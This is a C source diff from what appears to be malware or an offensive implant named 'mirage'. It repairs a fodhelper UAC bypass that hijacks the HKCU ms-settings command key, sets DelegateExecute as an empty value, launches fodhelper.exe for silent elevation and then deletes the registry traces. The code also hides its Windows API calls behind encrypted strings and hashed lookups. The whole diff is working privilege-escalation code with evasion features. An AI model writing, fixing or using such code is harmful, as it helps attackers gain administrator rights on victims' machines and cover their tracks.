@@ -17,6 +17,8 @@ typedef LONG   (WINAPI *pRegCreateKeyExW)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, D
 typedef LONG   (WINAPI *pRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE *, DWORD);
 typedef LONG   (WINAPI *pRegCloseKey)(HKEY);
 typedef LONG   (WINAPI *pRegDeleteKeyW)(HKEY, LPCWSTR);
+typedef LONG   (WINAPI *pRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, DWORD, PHKEY);
+typedef LONG   (WINAPI *pRegDeleteValueW)(HKEY, LPCWSTR);
 typedef BOOL   (WINAPI *pCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
 typedef DWORD  (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
 typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);
@@ -30,6 +32,8 @@ static struct {
     pRegSetValueExW         pRegSetValueExW;
     pRegCloseKey            pRegCloseKey;
     pRegDeleteKeyW          pRegDeleteKeyW;
+    pRegOpenKeyExW          pRegOpenKeyExW;
+    pRegDeleteValueW        pRegDeleteValueW;
     pCreateProcessW         pCreateProcessW;
     pWaitForSingleObject    pWaitForSingleObject;
     pCloseHandle            pCloseHandle;
@@ -57,6 +61,10 @@ static int uac_ensure_api(void) {
     g_uac_api.pRegCloseKey = (pRegCloseKey)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
     enc_decrypt(enc_RegDeleteKeyW, ENC_REGDELETEKEYW_LEN, fn);
     g_uac_api.pRegDeleteKeyW = (pRegDeleteKeyW)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_RegOpenKeyExW, ENC_REGOPENKEYEXW_LEN, fn);
+    g_uac_api.pRegOpenKeyExW = (pRegOpenKeyExW)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_RegDeleteValueW, ENC_REGDELETEVALUEW_LEN, fn);
+    g_uac_api.pRegDeleteValueW = (pRegDeleteValueW)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
     enc_decrypt(enc_AllocateAndInitializeSid, ENC_ALLOCATEANDINITIALIZESID_LEN, fn);
     g_uac_api.pAIIS = (pAllocateAndInitializeSid_uac)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
     enc_decrypt(enc_CheckTokenMembership, ENC_CHECKTOKENMEMBERSHIP_LEN, fn);
@@ -65,7 +73,7 @@ static int uac_ensure_api(void) {
     g_uac_api.pFS = (pFreeSid_uac)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
 
     if (!g_uac_api.pRegCreateKeyExW || !g_uac_api.pRegSetValueExW ||
-        !g_uac_api.pRegCloseKey || !g_uac_api.pRegDeleteKeyW ||
+        !g_uac_api.pRegOpenKeyExW || !g_uac_api.pRegDeleteValueW ||
         !g_uac_api.pAIIS || !g_uac_api.pCTM || !g_uac_api.pFS)
         return 0;
 
@@ -110,6 +118,9 @@ int mirage_is_elevated(void) {
 }
 
 /* ── fodhelper UAC bypass ──────────────────────────────────── */
+int mirage_uac_cleanup(void);
+
+
 
 int mirage_uac_bypass(const char *exe_path) {
     if (mirage_is_elevated()) return 0;
@@ -134,25 +145,15 @@ int mirage_uac_bypass(const char *exe_path) {
 
     result = g_uac_api.pRegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE*)wpath,
                                        (DWORD)(wlen * sizeof(WCHAR)));
+    if (result != ERROR_SUCCESS) { g_uac_api.pRegCloseKey(hKey); return -1; }
+
+    /* Set DelegateExecute to an empty REG_SZ VALUE (canonical fodhelper
+     * technique). The old code created a DelegateExecute SUBKEY, which the
+     * COM activation ignores. Key handle is still open — reuse it. */
+    result = g_uac_api.pRegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
+                                       (const BYTE*)L"", sizeof(WCHAR));
     g_uac_api.pRegCloseKey(hKey);
     if (result != ERROR_SUCCESS) return -1;
-
-    /* Set DelegateExecute to empty — append to the already-decrypted path */
-    wchar_t delegate_path[192];
-    /* Re-decrypt and append \DelegateExecute */
-    enc_decrypt_wide(enc_wreg_mssettings, ENC_WREG_MSSETTINGS_LEN, delegate_path);
-    size_t dl = 0; while (delegate_path[dl]) dl++;
-    wchar_t suffix[32];
-    enc_decrypt_wide(enc_wDelegateExecute, ENC_WDELEGATEEXECUTE_LEN, suffix);
-    delegate_path[dl++] = L'\\';
-    for (int i = 0; suffix[i] && dl < 191; i++, dl++) delegate_path[dl] = suffix[i];
-    delegate_path[dl] = L'\0';
-
-    result = g_uac_api.pRegCreateKeyExW(
-        HKEY_CURRENT_USER,
-        delegate_path,
-        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
-    if (result == ERROR_SUCCESS) g_uac_api.pRegCloseKey(hKey);
 
     /* Launch fodhelper.exe to trigger UAC bypass */
     STARTUPINFOW si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
@@ -166,6 +167,10 @@ int mirage_uac_bypass(const char *exe_path) {
         g_uac_api.pCloseHandle(pi.hThread);
     }
 
+    /* Remove HKCU artifacts on both success and failure paths — the old
+     * code never called cleanup, leaving hijacked ms-settings keys behind. */
+    mirage_uac_cleanup();
+
     return 0;
 }
 
@@ -177,17 +182,17 @@ int mirage_uac_cleanup(void) {
     wchar_t wreg_ms[128];
     enc_decrypt_wide(enc_wreg_mssettings, ENC_WREG_MSSETTINGS_LEN, wreg_ms);
 
-    /* Delete DelegateExecute subkey first */
-    wchar_t delegate_path[192];
-    enc_decrypt_wide(enc_wreg_mssettings, ENC_WREG_MSSETTINGS_LEN, delegate_path);
-    size_t dl = 0; while (delegate_path[dl]) dl++;
-    wchar_t suffix[32];
-    enc_decrypt_wide(enc_wDelegateExecute, ENC_WDELEGATEEXECUTE_LEN, suffix);
-    delegate_path[dl++] = L'\\';
-    for (int i = 0; suffix[i] && dl < 191; i++, dl++) delegate_path[dl] = suffix[i];
-    delegate_path[dl] = L'\0';
+    /* Delete the DelegateExecute VALUE (4.4 writes it as a value, not a
+     * subkey) via RegOpenKeyExW + RegDeleteValueW on the Command key. */
+    HKEY hKey;
+    LONG result = g_uac_api.pRegOpenKeyExW(
+        HKEY_CURRENT_USER, wreg_ms, 0, KEY_SET_VALUE, &hKey);
+    if (result == ERROR_SUCCESS) {
+        g_uac_api.pRegDeleteValueW(hKey, L"DelegateExecute");
+        g_uac_api.pRegCloseKey(hKey);
+    }
 
-    g_uac_api.pRegDeleteKeyW(HKEY_CURRENT_USER, delegate_path);
+    /* Remove the hijacked Command key itself */
     g_uac_api.pRegDeleteKeyW(HKEY_CURRENT_USER, wreg_ms);
     return 0;
 }
